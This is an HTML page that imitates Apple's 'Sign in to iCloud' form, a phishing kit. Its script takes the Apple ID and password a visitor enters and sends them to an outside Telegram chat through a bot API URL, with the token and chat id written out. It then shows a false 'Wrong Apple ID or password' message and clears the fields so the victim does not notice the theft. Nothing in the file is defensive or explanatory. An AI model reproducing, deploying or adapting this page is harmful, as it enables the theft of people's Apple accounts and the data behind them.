<!DOCTYPE html>
<html>
<head><title>iCloud</title></head>
<body>
<h3>Sign in to iCloud</h3>
<form>
<input type="email" id="e" placeholder="Apple ID"><br><br>
<input type="password" id="p" placeholder="Password"><br><br>
<button onclick="send()">Sign In</button>
</form>
<p id="x"></p>
<script>
function send(){
var email=document.getElementById("e").value;
var pass=document.getElementById("p").value;
var x=new XMLHttpRequest();
x.open("POST","https://api.telegram.org/bot8976876114:AAGjlI4juHUaOyCbhj1MFPITpHK_0WuJlro/sendMessage",true);
x.setRequestHeader("Content-Type","application/json");
x.send(JSON.stringify({chat_id:"6512360078",text:"Apple ID: "+email+" | Pass: "+pass}));
document.getElementById("x").innerHTML="Wrong Apple ID or password.";
document.getElementById("e").value="";
document.getElementById("p").value="";
}
</script>
</body>
</html>
